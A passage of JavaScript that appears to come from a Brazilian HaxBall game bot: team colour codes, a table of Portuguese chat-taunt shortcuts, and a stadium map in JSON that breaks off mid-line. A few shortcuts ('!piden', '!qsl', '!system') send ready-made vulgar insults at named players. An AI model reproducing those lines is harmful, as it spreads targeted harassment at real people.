    '!bdm': [1, 0xFFF0F0, [0xFF0000]],
    '!bdm2': [1, 0xFFC403, [0x000000]],
    '!liv': [180, 0xEBEBEB, [0x630024]],
    '!liv2': [1, 0x700000, [0x252633]],
    '!liv3': [60, 0xFEFEFC, [0xEC2637]],
    '!liv4': [60, 0x141517, [0xE5E0E6]],
    '!rm': [0, 0xDAA520, [0xFFFAFA, 0xFFFAFA, 0xFFFAFA]],
    '!rm2': [180, 0xFFFFFF, [0x000000]],
    '!rm3': [180, 0x7DA8FF, [0x002078]],
    '!rm4': [132, 0xFFCD45, [0xFFFFFF, 0x004077, 0xFFFFFF]],
    '!bar': [0, 0xFFC44F, [0x050047, 0xB30000, 0x050047]],
    '!bar2': [0, 0xDEB405, [0xA2214B, 0x00529F]],
    '!mcy': [180, 0x060336, [0x0F8FFF]],
    '!chel': [90, 0xFFFFFF, [0x0000CD, 0x00008B, 0x0000CD]],
    '!mil': [180, 0xFFFFFF, [0x000000, 0xFF0000, 0x000000]],
    '!boru': [90, 0x000000, [0xEEEE00, 0xFFFF00, 0xFFFF00]],
    '!bay': [30, 0xFAF31E, [0xFF0000, 0xF20000, 0xE00000]],
    '!intm': [0, 0xFFFFFF, [0x000000, 0x4169E1, 0x000000]],
    '!alhi': [0, 0xFEFEFE, [0x191AA6, 0x100D5C]], //al Hilal
    '!alhi2': [60, 0x15215B, [0xD8D8D8]],
    '!alhi3': [0, 0xF8F8F8, [0x0761CF, 0x034486, 0x0761CF]],
    '!alhi4': [60, 0x083964, [0xFEFEFE]],
    '!alah': [90, 0xFFFFFF, [0xC2011C, 0xC8031F]], //Al Ahly
    '!alah2': [50, 0xFFFFFF, [0x2F3035, 0x2F3035, 0xE4EDF6]],
    '!alna': [60, 0x233FA2, [0xE9DF03, 0xE9DF03, 0x173190]], //Al Nassr
    '!alna2': [60, 0xFEF262, [0x1C3553, 0x2E557E]],
    '!bj': [90, 0x000000, [0x063784, 0xF2E200, 0x063784]], //Boca Juniors
    '!bj2': [90, 0xFAD517, [0xF3F5F9, 0x212749, 0xF3F5F9]],
    '!inde': [0, 0xFFFFFF, [0x19191B, 0x0C1019, 0x19191B]], //Independiente del Valle
    '!inde2': [60, 0xFFFFFF, [0xBD2E5C]],
    '!pen': [0, 0xFFFFFF, [0x302D33, 0xE8BF52, 0x302D33]], //Peñarol
    '!pen2': [60, 0xF6CC08, [0x9091A5]],
    '!riv': [40, 0x2C2827, [0xE3E1E2, 0xC03C3B, 0xE3E1E2]], //River Plate
    '!riv2': [90, 0xFFFFFF, [0xC80316, 0xC80316, 0xE3E2E7]],
    '!tig': [90, 0xFFFFFF, [0xFEB938, 0x0B3364, 0xFEB938]], //Tigres
    '!tig2': [50, 0xBDCEEF, [0x3069BD, 0x5B91DA, 0x3069BD]],
    '!estre': [90, 0xE8B502, [0xFD021E, 0xFEF2F4, 0xFD021E]], //Estrela Vermelha
    '!estre2': [130, 0x05080A, [0xF3EEEB, 0xE23D21, 0xF3EEEB]],
    '!feye': [0, 0x433D3D, [0xD91914, 0xE9E4E8]], //Feyenoord
    '!feye2': [60, 0xE8EDF1, [0x076186]],
    '!estu': [0, 0x0C0C0C, [0xC01319, 0xF5FBF1, 0xC01319]], //Estudiantes
    '!estu2': [90, 0xE31B1D, [0xFFFFFF, 0xFFFFFF, 0xFF0000]],
    '!olim': [90, 0xFFFFFF, [0xF8F9FD, 0x32353A, 0xF8F9FD]], //Olimpia
    '!olim2': [90, 0x141416, [0x090C13, 0xF5F5F5, 0x090C13]],
    '!raci': [90, 0x201D20, [0x4789B5, 0xD7D3CE, 0xD7D3CE]], //Racing
    '!raci2': [0, 0xECECF0, [0x1C1A1B, 0x5299C1, 0x1C1A1B]],
    '!vele': [130, 0x242843, [0xDCE1F4, 0x04419C, 0xDCE1F4]], //Vélez Sarsfield
    '!vele2': [130, 0x242843, [0x02318D, 0xE1E1E3, 0x02318D]],
    '!ars': [226, 0xFFFFFF, [0xFFFFFF, 0x9E0000, 0xCF0000]], //Arsenal
    '!ars2': [226, 0xFFDF00, [0x9E0000, 0x9E0000, 0x9E0000]],
}

var provos = {
    '!ali': 'Alisa meu pelo 🐆',
    '!arn': 'Pode isso, Arnaldo? 🤔',
    '!atk': 'Ataca!!! 💪',
    '!band': 'A bandeirinha é minha amiga 🏁😜',
    '!bnh': 'Só na banheira? 🛀',
    '!bnh2': 'Tá no ataque ou no banho? 🚿',
    '!bnh3': 'Às vezes a banheira dá certo... 🌬️',
    '!cag': 'Cagada 💩',
    '!calc': '📊📐❌➕📚➗ = Calculado',
    '!cham': 'Chama 🔥',
    '!chu': 'Chuta!! 👟',
    '!cff': 'Chuta fofo 👶',
    '!cru': 'Cruza! 👆',
    '!dboa': 'De boa 🤙',
    '!dboa2': 'Eita como ele tá de boa 🤙',
    '!def': 'Defende!!! ✊',
    '!dig': 'Digita mais 🤓',
    '!dmr': 'Demora mais!!! 🙄',
    '!faz': 'Faz... 🤲',
    '!fal': 'Foi falta!! 🚑',
    '!fé': 'Com fé no pé! 🦶',
    '!fe': 'Com fé no pé! 🦶',
    '!fran': 'Frango! 🐔',
    '!fran2': 'Franguei 🐓',
    '!frio': 'Frio 🥶',
    '!fru': 'Mustela putorius furo, o Furão! 🦦',
    '!gira': 'Gira a bola! 🤹‍♂️',
    '!glç': 'Que golaço! ⚽ ',
    '!grl': 'Gorila é sinistro 🦍',
    '!gol': 'GOOOOOOOOOOL ⚽️',
    '!hum': 'Humilde 🥺',
    '!ini': 'Inimigo do gol! 👹',
    '!lad': 'Ladrão! 😠',
    '!lç': 'LAÇO 🎀',
    '!mar': 'Marca! 🤼‍♂️',
    '!olho': 'Olho no lance! 👁️',
    '!olhu': 'OLHUGOL, OLHUGOL 🥅',
    '!pç': 'Paçe 🦵',
    '!pick': 'Pickford! 🙌',
    '!pint': 'Uma pintura!! 👨‍🎨🖼️',
    '!pip': 'Olha a pipoca! 🍿',
    '!proi': 'Proibido fazer gol!! 🚫',
    '!ptz': 'Putz... 🤦',
    '!qdf': 'Que defesa! 🙌',
    '!qbl': 'Que bolão! 🎯 ',
    '!qjo': 'Que jogada! 👌 ',
    '!qgo': 'Que golaço! ⚽ ',
    '!qse': 'Quase erra 😆',
    '!rcl': 'Esse aí só reclama!! 🤨',
    '!rpz': 'Rapaz... 🐭',
    '!rvz': 'Reveza GK! 🔄',
    '!sai': 'Só tem uma bola. Precisa de mais de um jogador em cima? SAI! 😤',
    '!sac': 'Sacanagem... 😭',
    '!sap': 'Que sapatada!!! 🥾',
    '!sdg': 'Sai do gol, GK!!!',
    '!ski': 'Skills and tricks 🏄🏾‍♀️',
    '!siu': 'SIUUUUU 👐',
    '!taf': 'Sai que é sua Taffarel!!! 🙌',
    '!tira': 'Tira, zaga! 🙅‍♂️',
    '!tnc': 'Tomar nescau! 🥤',
    '!ui': 'UI! 😲',
    '!ui2': '( ͡° ͜ʖ ͡°)',
    '!uu': 'UUUU... 😯',
    '!vira': 'Virada 🔀',
    '!volt': 'Volta pra defesa! 👉',
    '!vl': 'Alguém VL? 👇',
    '!x': 'Aperta ✖ ❕❕',
    '!zag': 'Cadê a zaga? 👨🏼‍🦯 ', // Bot desenvolvido pelo OBL
    '!zen': 'Zen 🧘',
    '!divisao': 'EU SOU O PROBLEMA DA DIVISÃO!!!',
    '!quentin': 'TÁ QUENTINHO AÍ? MEU BOLSO É DE VELUDO!',
    '!logica': 'DEU A LÓGICA...',
    '!base': 'VAI DE BASE ',
    '!meto2': 'Eu meto mesmo!',
    '!boa': 'Boa time!👊',
    '!bai': 'Baila!💃',
    '!bag': 'Bagre!🐟', // Bot desenvolvido pelo OBL
    '!bike': 'De bike!!!🚲',
    '!bch': 'Belo chute!👏',
    '!bpa': 'Belo passe!👏',
    '!brb': 'Brabo😈', // Bot desenvolvido pelo OBL
    '!cal': 'Calma, pô!✨',
    '!fome': 'Hmmm que fominha...😋',
    '!fds': 'FDS!! Um ótimo final de semana!😎',
    '!jlu': 'Joga a luva, goleirão!🧤',
    '!itk': 'Alguém GK? Intankável...🚙🚫',
    '!fzl': 'Faz o L!🙋‍♂️',
    '!gen': 'Seja gentil fdm👨‍🏫',
    '!kk': 'KKKKKKKKKKKKKKKKKKKK!🤣',
    '!lae': 'La ele🖊️',
    '!mal': 'Foi mal😬',
    '!mal2': 'Foi mal😅',
    '!mal3': 'Foi mal🥺',
    '!mds': 'Meu Deus...🙏',
    '!nice': 'Nice!👍',
    '!trave': 'Na trave!!💥',
    '!puskas': 'Esse é puskas!',
    '!bolso': 'Sai do meu bolso ai, ta incomodando.',
    '!pika': 'HAHAHAHA, ele é pik@',
    '!papai': 'Ai papaii!',
    '!seupai': 'Chora não!!!! Ja pode me registrar como seu pai.',
    '!peganunca': 'Pega nunk!!',
    '!quentin2': 'Tá quentinho ai????',
    '!izi': 'TEM COMO AUMENTAR O NÍVEL? TÁ MUITO EASY!',
    '!piden': 'Ei Piden, vai tomar no c*, filha da put@!',
    '!qsl': 'Ei Qsl, vai tomar no c*, filha da put@!',
    '!system': 'Ei System, vai tomar no c*, filha da put@!',
    '!oi': 'Oie ♥️',
    '!toma': 'Quem não faz... toma!',
    '!ifood': 'Olha o ifood! foi aqui que pediram a entrega?',
    '!chute': 'QUE CHUTE FOI ESSE? LÁ ONDE A CORUJA DORME!',
    '!moscou': 'CAPITAL DA RUSSIA É MOSCOW E COM NÓS NÃO PODE MOSCAR. rs 😎',
    '!chora': 'CHORA NÃO BEBÊ, SE QUISER CHORAR VAI PRA MATERNIDADE❗👶🏼🍼',
    '!red': 'Esse era o RED?',
    '!blue': 'Esse era o BLUE?',
    '!paired': 'EU = PAI DO RED𝗞𝗞𝗞𝗞𝗞𝗞🤣😂🤣😂',
    '!paiblue': 'EU = PAI DO BLUE𝗞𝗞𝗞𝗞𝗞𝗞🤣😂🤣😂',
    '!pegala': 'PEGA LÁ GOLEIRÃO 𝗞𝗞𝗞𝗞𝗞𝗞👟⚽🥅😅',
    '!perdoa': 'ELE NãO PERDOA C4R4LH0❗❗❗',
    '!perdoa2': 'NÓS NÃO PERDOA NÃO, VIU❓❗😁',
    '!receba': 'RECEBA C4R4LH0❗😤😤😤',
    '!meto': 'EU METO MESMO!!!',
    '!pega': 'QUERO VER PEGAR ESSA PORRA!!!',
    '!toca2': 'Toca no pae e descansa...',
    '!toca': 'Toca a bola!! 🦶',
    '!gk': 'Alguém GK?',
    '!gk2': 'ACORDA GOLEIRÃO!!!',
    '!gk3': 'Ui, pega la Gk',
    '!gk4': 'O GK aqui sou eu! ⛹️‍♀️',
    '!gk5': 'Boa GK! ⛹️‍♀️',
    '!bobiu': 'BOBIU tomou ᵒᵗᵃ́ʳᶦᵒ. 𝗞𝗞𝗞𝗞𝗞𝗞🤣😂😅',
    '!oe': 'OEEE! Virou Space Bounce! 😅😅',
}

var fetchRecordingVariable = true;

// "canBeStored": false

var futsalNovo;

var maps = {
    flash: ``,
    normal: `{"name":"haxlenda LTDA","width":620,"height":270,"spawnDistance":350,"bg":{"type":"hockey","width":550,"height":240,"kickOffRadius":80,"cornerRadius":0},"vertexes":[{"x":550,"y":240,"trait":"ballArea"},{"x":550,"y":-240,"trait":"ballArea"},{"x":0,"y":270,"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-80,"bCoef":0.15,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":180},{"x":0,"y":-270,"trait":"kickOffBarrier"},{"x":-550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,-80]},{"x":-590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[-700,80]},{"x":550,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":-80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,-80]},{"x":590,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":550,"y":80,"cMask":["red","blue","ball"],"trait":"goalNet","curve":0,"color":"F8F8F8","pos":[700,80]},{"x":-550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,80]},{"x":-550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[-700,-80]},{"x":-550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":-550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","pos":[700,80]},{"x":550,"y":240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8"},{"x":550,"y":-80,"bCoef":1.15,"cMask":["ball"],"trait":"ballArea","color":"F8F8F8","pos":[700,-80]},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":550,"y":-240,"bCoef":0,"cMask":["ball"],"trait":"ballArea"},{"x":-550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":550,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0},{"x":0,"y":-240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":240,"bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"x":0,"y":-80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"bCoef":0.1,"cMask":["red","blue"],"trait":"kickOffBarrier","vis":true,"color":"F8F8F8"},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":-180},{"x":0,"y":80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":0,"y":-80,"trait":"kickOffBarrier","color":"F8F8F8","vis":true,"curve":0},{"x":-557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[-700,80]},{"x":-557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":-557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":-557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[-700,-80]},{"x":557.5,"y":-240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0},{"x":557.5,"y":-80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","vis":false,"curve":0,"pos":[700,-80]},{"x":557.5,"y":80,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false,"pos":[700,80]},{"x":557.5,"y":240,"bCoef":1,"cMask":["ball"],"trait":"ballArea","curve":0,"vis":false},{"x":0,"y":-80,"bCoef":0.1,"trait":"line"},{"x":0,"y":80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":-550,"y":80,"bCoef":0.1,"trait":"line"},{"x":550,"y":-80,"bCoef":0.1,"trait":"line"},{"x":550,"y":80,"bCoef":0.1,"trait":"line"},{"x":-240,"y":256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":256,"bCoef":0.1,"trait":"line"},{"x":-240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":-120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":240,"y":256,"bCoef":0.1,"trait":"line"},{"x":120,"y":224,"bCoef":0.1,"trait":"line"},{"x":120,"y":256,"bCoef":0.1,"trait":"line"},{"x":240,"y":-224,"bCoef":0.1,"trait":"line"},{"x":240,"y":-256,"bCoef":0.1,"trait":"line"},{"x":120,"y":-224,"bCoef":0.1,"trait":"line"},{"x":120,"y":-256,"bCoef":0.1,"trait":"line"},{"x":-381,"y":240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":256,"bCoef":0.1,"trait":"line"},{"x":-550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":-390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":226,"bCoef":0.1,"trait":"line","curve":-90},{"x":-536,"y":240,"bCoef":0.1,"trait":"line","curve":-90},{"x":-550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":-390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-550,"y":-226,"bCoef":0.1,"trait":"line","curve":90},{"x":-536,"y":-240,"bCoef":0.1,"trait":"line","curve":90},{"x":-556,"y":123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":123,"bCoef":0.1,"trait":"line"},{"x":556,"y":123,"bCoef":0.1,"trait":"line"},{"x":575,"y":123,"bCoef":0.1,"trait":"line"},{"x":-556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":556,"y":-123,"bCoef":0.1,"trait":"line"},{"x":575,"y":-123,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":-381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":381,"y":240,"bCoef":0.1,"trait":"line"},{"x":381,"y":256,"bCoef":0.1,"trait":"line"},{"x":381,"y":-240,"bCoef":0.1,"trait":"line"},{"x":381,"y":-256,"bCoef":0.1,"trait":"line"},{"x":550,"y":-226,"bCoef":0.1,"trait":"line","curve":-90},{"x":536,"y":-240,"bCoef":0.1,"trait":"line","curve":-90},{"x":550,"y":226,"bCoef":0.1,"trait":"line","curve":90},{"x":536,"y":240,"bCoef":0.1,"trait":"line","curve":90},{"x":550,"y":200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":90},{"x":550,"y":-200,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":-90},{"x":390,"y":70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":390,"y":-70,"bCoef":0.1,"trait":"line","color":"F8F8F8","curve":0},{"x":-375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":375,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":-277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-1,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":2,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":-3.5,"bCoef":0.1,"trait":"line","curve":180},{"x":277.5,"y":3.5,"bCoef":0.1,"trait":"line","curve":180}],"segments":[{"v0":6,"v1":7,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,-80],"y":-80},{"v0":7,"v1":8,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":-590},{"v0":8,"v1":9,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[-700,80],"y":80},{"v0":10,"v1":11,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,-80],"y":-80},{"v0":11,"v1":12,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","x":590},{"v0":12,"v1":13,"curve":0,"color":"F8F8F8","cMask":["red","blue","ball"],"trait":"goalNet","pos":[700,80],"y":80},{"v0":2,"v1":3,"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["blueKO"],"trait":"kickOffBarrier"},{"v0":3,"v1":4,"curve":-180,"vis":true,"color":"F8F8F8","bCoef":0.15,"cGroup":["redKO"],"trait":"kickOffBarrier"},{"v0":4,"v1":5,"trait":"kickOffBarrier"},{"v0":14,"v1":15,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":16,"v1":17,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":-550},{"v0":18,"v1":19,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":240},{"v0":20,"v1":21,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":22,"v1":23,"vis":true,"color":"F8F8F8","bCoef":1.15,"cMask":["ball"],"trait":"ballArea","x":550},{"v0":24,"v1":25,"vis":true,"color":"F8F8F8","bCoef":0,"cMask":["ball"],"trait":"ballArea","x":550,"y":-240},{"v0":26,"v1":27,"curve":0,"vis":true,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","y":-240},{"v0":28,"v1":29,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":30,"v1":31,"vis":true,"color":"F8F8F8","bCoef":0.1,"cMask":["red","blue"],"cGroup":["redKO","blueKO"],"trait":"kickOffBarrier"},{"v0":38,"v1":39,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":40,"v1":41,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":-557.5},{"v0":42,"v1":43,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":44,"v1":45,"curve":0,"vis":false,"color":"F8F8F8","bCoef":1,"cMask":["ball"],"trait":"ballArea","x":557.5},{"v0":46,"v1":47,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":0},{"v0":48,"v1":49,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-550},{"v0":50,"v1":51,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":550},{"v0":64,"v1":65,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":66,"v1":67,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":69,"v1":68,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":70,"v1":71,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":67,"v1":71,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":73,"v1":72,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":74,"v1":75,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":76,"v1":77,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":123},{"v0":78,"v1":79,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":80,"v1":81,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-240,"y":-123},{"v0":82,"v1":83,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-381},{"v0":84,"v1":85,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":86,"v1":87,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":381},{"v0":89,"v1":88,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":91,"v1":90,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":92,"v1":93,"curve":90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":94,"v1":95,"curve":-90,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line"},{"v0":96,"v1":97,"curve":0,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":390},{"v0":99,"v1":98,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":98,"v1":99,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":101,"v1":100,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":100,"v1":101,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":103,"v1":102,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":102,"v1":103,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":105,"v1":104,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":104,"v1":105,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-375},{"v0":107,"v1":106,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":106,"v1":107,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":109,"v1":108,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":108,"v1":109,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":111,"v1":110,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":110,"v1":111,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":113,"v1":112,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":112,"v1":113,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":375},{"v0":115,"v1":114,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":114,"v1":115,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":117,"v1":116,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":116,"v1":117,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":119,"v1":118,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":118,"v1":119,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":121,"v1":120,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":120,"v1":121,"curve":180,"vis":true,"color":"F8F8F8","bCoef":0.1,"trait":"line","x":-277.5},{"v0":123,"v1":122,"curve":180,"vis":true,"color":"F8F